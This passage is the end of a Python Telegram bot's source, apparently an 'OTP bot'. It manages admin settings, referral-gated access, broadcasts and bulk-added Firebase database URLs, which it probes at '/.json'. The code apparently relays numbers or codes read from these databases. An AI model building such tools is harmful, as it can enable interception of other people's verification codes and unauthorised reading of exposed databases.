        _send_rows(target.chat_id, text, buttons, edit_message_id=target.message_id)
    else:
        _send_rows(update.effective_chat.id, text, buttons)


async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Access denied.")
        return
    await _admin_panel(update, context)


def _is_valid_firebase_url(url: str) -> bool:
    url = url.strip().rstrip("/")
    return bool(re.match(
        r"^https://[a-zA-Z0-9\-]+(-default-rtdb)?\.(firebaseio\.com|([a-z0-9\-]+\.)?firebasedatabase\.app)$",
        url))


async def addfb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    awaiting_input[update.effective_user.id] = "fbadd"
    if is_admin(update.effective_user.id):
        await update.message.reply_text(
            f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
            f"➕ <b>Firebase add karo</b>\n\n"
            f"• Ek URL bhejo ya <b>bulk</b> (har line me ek URL)\n"
            f"• Already added URL skip ho jayega ✅\n\n"
            f"Example:\n"
            f"<code>https://myapp-default-rtdb.firebaseio.com</code>\n"
            f"<code>https://myapp2-default-rtdb.firebaseio.com</code>\n\n"
            f"Cancel: /cancel",
            parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(
            f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
            f"➕ <b>Apna Firebase add karo</b>\n\n"
            f"Apne panel ka Firebase URL bhejo 👇\n"
            f"<code>https://yourpanel-default-rtdb.firebaseio.com</code>\n\n"
            f"Cancel: /cancel",
            parse_mode=ParseMode.HTML)


def _test_firebase_url(url: str) -> bool:
    try:
        r = requests.get(f"{url.rstrip('/')}/.json", timeout=4)
        return r.status_code in (200, 403)
    except Exception:
        return False


async def _test_firebase_urls_async(urls: List[str]) -> Dict[str, bool]:
    """Saare URLs ek saath (concurrent) test — bot freeze nahi hoga."""
    async def one(url):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(f"{url.rstrip('/')}/.json", timeout=aiohttp.ClientTimeout(total=5)) as r:
                    return url, r.status in (200, 403)
        except Exception:
            return url, False
    results = await asyncio.gather(*[one(u) for u in urls])
    return dict(results)


async def _handle_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE, data: str):
    query = update.callback_query
    if data == "verify":
        if await _force_join_ok(update, context):
            await query.answer("✅ Verified!", show_alert=True)
            uid = query.from_user.id
            if is_admin(uid) or has_access(uid):
                await _ui(update, query.message.chat_id,
                          f"{BRAND}\n━━━━━━━━━━━━━━━━\n✅ <b>Joined!</b>\nAb buttons se numbers dekho.",
                          home_keyboard(uid), mid=query.message.message_id)
            else:
                text, rows = _refer_screen_text(uid,
                                                query.from_user.first_name or "User", context)
                await _ui(update, query.message.chat_id, text, rows,
                          mid=query.message.message_id)
        else:
            await query.answer("Abhi bhi join nahi hai", show_alert=True)
        return

    if data == "checkaccess":
        if has_access(query.from_user.id):
            await query.answer("✅ Access hai!", show_alert=True)
            await _ui(update, query.message.chat_id,
                      f"{BRAND}\n━━━━━━━━━━━━━━━━\n✅ <b>Access ready!</b>\nAb buttons se numbers dekho.",
                      home_keyboard(query.from_user.id), mid=query.message.message_id)
        else:
            text, rows = _refer_screen_text(query.from_user.id,
                                            query.from_user.first_name or "User", context)
            await _ui(update, query.message.chat_id, text, rows,
                      mid=query.message.message_id)
        return

    if not is_admin(query.from_user.id):
        await query.answer("❌ Access denied", show_alert=True)
        return

    if data == "admin":
        await _admin_panel(update, context, query.message)

    elif data == "fjtoggle":
        fjoin = settings.setdefault("force_join", {"enabled": False, "channels": []})
        fjoin["enabled"] = not fjoin.get("enabled")
        save_settings()
        await _admin_panel(update, context, query.message)

    elif data == "grant":
        awaiting_input[query.from_user.id] = "grant"
        await _ui(update, query.message.chat_id,
                  f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                  f"🎟 <b>Access do kisiko</b>\n\n"
                  f"User ID bhejo (24 hour access milega):\n"
                  f"<code>123456789</code>\n\n"
                  f"Ya hours ke saath:\n"
                  f"<code>123456789 48</code>",
                  [B("❌ Cancel", "cancelinput", style="danger", icon=ICON_RED)],
                  mid=query.message.message_id)

    elif data == "fjadd":
        awaiting_input[query.from_user.id] = "channel"
        await _ui(update, query.message.chat_id,
                  f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                  f"📢 Channel ka <b>@username</b> bhejo\n"
                  f"(pehle bot ko us channel me ADMIN banao)",
                  [B("❌ Cancel", "cancelinput", style="danger", icon=ICON_RED)],
                  mid=query.message.message_id)

    elif data == "fjrm":
        chans = settings.get("force_join", {}).get("channels", [])
        if not chans:
            await query.answer("Koi channel nahi hai", show_alert=True)
            return
        buttons = [[B(f"🗑 {c}", f"fjdel|{i}", style="danger", icon=ICON_RED)]
                   for i, c in enumerate(chans)]
        buttons.append([B("◀ Back", "admin", style="primary")])
        _send_rows(query.message.chat_id,
                   f"{BRAND}\n━━━━━━━━━━━━━━━━\nRemove karne wala channel select karo 👇",
                   buttons, edit_message_id=query.message.message_id)

    elif data.startswith("fjdel|"):
        i = int(data.split("|")[1])
        chans = settings.get("force_join", {}).get("channels", [])
        if 0 <= i < len(chans):
            chans.pop(i)
            save_settings()
        await _admin_panel(update, context, query.message)

    elif data.startswith("int|"):
        val = float(data.split("|")[1])
        settings["monitor_interval"] = val
        save_settings()
        await query.answer(f"Interval {val:g}s set ✅")
        await _admin_panel(update, context, query.message)

    elif data == "clearcache":
        with state_lock:
            seen_keys.clear()
        save_seen_cache()
        await query.answer("Cache clear ✅", show_alert=True)

    elif data == "broadcast":
        awaiting_input[query.from_user.id] = "broadcast"
        await _ui(update, query.message.chat_id,
                  f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                  f"📢 Broadcast message likho — sab users ko jayega",
                  [B("❌ Cancel", "cancelinput", style="danger", icon=ICON_RED)],
                  mid=query.message.message_id)

    elif data == "fbadd":
        awaiting_input[query.from_user.id] = "fbadd"
        await _ui(update, query.message.chat_id,
                  f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                  f"➕ <b>Firebase add karo</b>\n\n"
                  f"• Ek URL ya <b>bulk</b> (har line me ek URL)\n"
                  f"• Duplicate → <b>skip</b> ✅",
                  [B("❌ Cancel", "cancelinput", style="danger", icon=ICON_RED)],
                  mid=query.message.message_id)

    elif data == "fbrm":
        user_dbs = settings.get("user_databases", {})
        if not user_dbs:
            await query.answer("Koi user Firebase nahi hai", show_alert=True)
            return
        buttons = [[B(f"🗑 {tag[:15]}… ({v.get('added_by', '?') if isinstance(v, dict) else '?'})",
                      f"fbdel|{tag}", style="danger", icon=ICON_RED)]
                   for tag, v in list(user_dbs.items())[:20]]
        buttons.append([B("◀ Back", "admin", style="primary")])
        _send_rows(query.message.chat_id,
                   f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                   f"Remove karne wala Firebase select karo 👇\n"
                   f"(Total: {len(user_dbs)})",
                   buttons, edit_message_id=query.message.message_id)

    elif data.startswith("fbdel|"):
        tag = data.split("|", 1)[1]
        ud = settings.get("user_databases", {})
        if tag in ud:
            del ud[tag]
            save_settings()
            await query.answer("Firebase remove ✅", show_alert=True)
        await _admin_panel(update, context, query.message)

    elif data == "users":
        users = settings.get("users", {})
        lines = []
        now = time.time()
        for uid, u in list(users.items())[:15]:
            try:
                until = float(u.get("access_until", 0))
            except (TypeError, ValueError):
                until = 0
            left = max(0, int((until - now) / 60))
            refs = len(u.get("referred", [])) if isinstance(u, dict) else 0
            lines.append(f"👤 <code>{uid}</code> — ⏱ {left} min | 👥 {refs} refs")
        text = (
            f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
            f"📊 <b>USERS & REFERS</b>\n"
            f"👥 Total users: <b>{len(users)}</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            + ("\n".join(lines) if lines else "Koi user nahi")
        )
        _send_rows(query.message.chat_id, text,
                   [[B("◀ Back", "admin", style="primary")]],
                   edit_message_id=query.message.message_id)


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    task = awaiting_input.get(user_id)
    if not task:
        return
    txt = (update.message.text or "").strip()
    try:
        if task == "channel":
            awaiting_input.pop(user_id, None)
            ch = txt if txt.startswith("@") else "@" + txt.lstrip("@")
            fjoin = settings.setdefault("force_join", {"enabled": False, "channels": []})
            if ch in fjoin["channels"]:
                await update.message.reply_text("⚠️ Ye channel pehle se hai.")
                return
            fjoin["channels"].append(ch)
            save_settings()
            await update.message.reply_text(
                f"✅ Channel <b>{html.escape(ch)}</b> add ho gaya!\n"
                f"Force Join abhi: {'ON' if fjoin.get('enabled') else 'OFF'} — Admin panel se ON karo.",
                parse_mode=ParseMode.HTML)

        elif task == "broadcast":
            awaiting_input.pop(user_id, None)
            if not is_admin(user_id):
                await update.message.reply_text("❌ Sirf admin.")
                return
            sent = 0
            targets = list(dict.fromkeys([r for r in ADMIN_IDS if r]))
            targets += [int(t) for t in settings.get("users", {}).keys()
                        if t.isdigit() and int(t) not in targets]
            for t in targets:
                try:
                    await context.bot.send_message(
                        t, f"📢 <b>BROADCAST</b>\n\n{html.escape(txt)}",
                        parse_mode=ParseMode.HTML)
                    sent += 1
                except Exception:
                    pass
            await update.message.reply_text(f"📢 Broadcast sent to {sent} users ✅")

        elif task == "grant":
            awaiting_input.pop(user_id, None)
            if not is_admin(user_id):
                await update.message.reply_text("❌ Sirf admin.")
                return
            parts = txt.split()
            if not parts or not parts[0].isdigit():
                await update.message.reply_text(
                    "❌ Format: <code>userid</code> ya <code>userid hours</code>",
                    parse_mode=ParseMode.HTML)
                return
            target_id = parts[0]
            try:
                hours = float(parts[1]) if len(parts) > 1 else 24.0
            except (IndexError, ValueError):
                hours = 24.0
            users = settings.setdefault("users", {})
            u = users.setdefault(target_id, {"access_until": 0, "referred": []})
            u["access_until"] = max(float(u.get("access_until", 0)),
                                    time.time() + hours * 3600)
            save_settings()
            await update.message.reply_text(
                f"✅ <b>Access grant!</b>\n"
                f"👤 User: <code>{target_id}</code>\n"
                f"⏰ {hours:g} hour access (up to "
                f"{datetime.now().strftime('%d %b %H:%M')})",
                parse_mode=ParseMode.HTML)

        elif task == "fbadd":
            awaiting_input.pop(user_id, None)
            if not is_admin(user_id):
                await update.message.reply_text("❌ Sirf ADMIN Firebase add kar sakta hai.")
                return
            if not txt:
                await update.message.reply_text("❌ URL nahi mila.")
                return
            lines = [ln.strip().rstrip("/") for ln in txt.splitlines() if ln.strip()]
            added, skipped, failed = [], [], []
            user_dbs = settings.setdefault("user_databases", {})
            existing = {str(v["url"]).rstrip("/") for v in user_dbs.values()
                        if isinstance(v, dict) and v.get("url")}
            builtin = {u.rstrip("/") for u in DATABASES.values()}
            n = len([t for t in user_dbs if t.startswith("admfb")])
            for url in lines:
                if not _is_valid_firebase_url(url):
                    failed.append((url, "invalid format"))
                    continue
                if url in existing or url in builtin:
                    skipped.append(url)
                    continue
                n += 1
                user_dbs[f"admfb_{n}"] = {"url": url, "added_by": user_id, "ts": time.time()}
                existing.add(url)
                added.append(url)
            save_settings()
            resp = (f"➕ <b>Firebase Add Result</b>\n━━━━━━━━━━━━━━━━\n"
                    f"✅ Added: <b>{len(added)}</b>\n"
                    f"⏭ Duplicate (skip): <b>{len(skipped)}</b>\n"
                    f"❌ Failed: <b>{len(failed)}</b>\n")
            if added:
                resp += "\n🆕 Added:\n" + "\n".join(f"  ✅ {u}" for u in added[:10])
                if len(added) > 10:
                    resp += f"\n  ... +{len(added) - 10} aur"
            if skipped:
                resp += "\n\n⏭ Skipped (pehle se hai):\n" + "\n".join(f"  • {u}" for u in skipped[:5])
            if failed:
                resp += "\n\n❌ Failed:\n" + "\n".join(f"  • {u} ({m})" for u, m in failed[:5])
            resp += "\n\n📡 Numbers button dabao — naya Firebase bhi dikhega!"
            await update.message.reply_text(resp, parse_mode=ParseMode.HTML)

    except Exception as e:
        log.exception("text_handler error")
        awaiting_input.pop(user_id, None)
        try:
            await update.message.reply_text(
                f"❌ Error: {html.escape(str(e))}\nDobara try karo ya ❌ Cancel button dabao.")
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin .txt file upload kare — har line me ek Firebase URL."""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Sirf admin.")
        return
    doc = update.message.document
    if not doc or not (doc.file_name or "").lower().endswith((".txt", ".json", ".csv")):
        await update.message.reply_text("❌ Sirf .txt file bhejo (har line me ek URL).")
        return
    try:
        f = await context.bot.get_file(doc.file_id)
        data = await f.download_as_bytearray()
        content = data.decode("utf-8", errors="replace")
    except Exception as e:
        await update.message.reply_text(f"❌ File read nahi hui: {html.escape(str(e))}")
        return
    lines = [ln.strip().rstrip("/") for ln in content.splitlines() if ln.strip()]
    if not lines:
        await update.message.reply_text("❌ File me koi URL nahi.")
        return
    try:
        added, skipped, failed = [], [], []
        user_dbs = settings.setdefault("user_databases", {})
        existing = {str(v["url"]).rstrip("/") for v in user_dbs.values()
                    if isinstance(v, dict) and v.get("url")}
        builtin = {u.rstrip("/") for u in DATABASES.values()}
        n = len([t for t in user_dbs if t.startswith("admfb")])
        for url in lines:
            if not _is_valid_firebase_url(url):
                failed.append((url, "invalid format"))
                continue
            if url in existing or url in builtin:
                skipped.append(url)
                continue
            n += 1
            user_dbs[f"admfb_{n}"] = {"url": url, "added_by": user_id, "ts": time.time()}
            existing.add(url)
            added.append(url)
        save_settings()
        resp = (f"📄 <b>File se Firebase Add</b>\n━━━━━━━━━━━━━━━━\n"
                f"✅ Added: <b>{len(added)}</b>\n"
                f"⏭ Duplicate (skip): <b>{len(skipped)}</b>\n"
                f"❌ Failed: <b>{len(failed)}</b>\n")
        if added:
            resp += "\n🆕 Added:\n" + "\n".join(f"  ✅ {u}" for u in added[:10])
            if len(added) > 10:
                resp += f"\n  ... +{len(added) - 10} aur"
        if failed:
            resp += "\n\n❌ Failed:\n" + "\n".join(f"  • {u} ({m})" for u, m in failed[:5])
        resp += "\n\n📡 Numbers button dabao — naya Firebase bhi dikhega!"
    except Exception as e:
        log.exception("document_handler error")
        resp = f"❌ Error: {html.escape(str(e))}\nDobara try karo."
    await update.message.reply_text(resp, parse_mode=ParseMode.HTML)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    awaiting_input.pop(update.effective_user.id, None)
    _send_rows(update.effective_chat.id, "❌ Cancelled.", home_keyboard(update.effective_user.id))


def main():
    global app_ref, bot_loop

    if BOT_TOKEN == "PASTE_YOUR_NEW_BOT_TOKEN_HERE":
        print("\n❌ Pehle BOT_TOKEN config me apna naya token daalo!\n")
        return

    load_seen_cache()
    load_settings()

    app_ref = Application.builder().token(BOT_TOKEN).build()

    app_ref.add_handler(CommandHandler("start", start))
    app_ref.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    app_ref.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app_ref.add_handler(CallbackQueryHandler(callback_handler))
    app_ref.add_error_handler(error_handler)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    bot_loop = loop

    def quiet_handler(loop_obj, context):
        exc = context.get("exception")
        if isinstance(exc, (socket.gaierror,)):
            return
        loop_obj.default_exception_handler(context)

    loop.set_exception_handler(quiet_handler)

    t = threading.Thread(target=monitor_loop, daemon=True)
    t.start()

    print("=" * 55)
    print(" 🥷 VIEDIET OTP BOT — started")
    print(f" 📡 Panels: {len(DATABASES)} | Admins: {len(ADMIN_IDS)}")
    print("=" * 55)

    app_ref.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
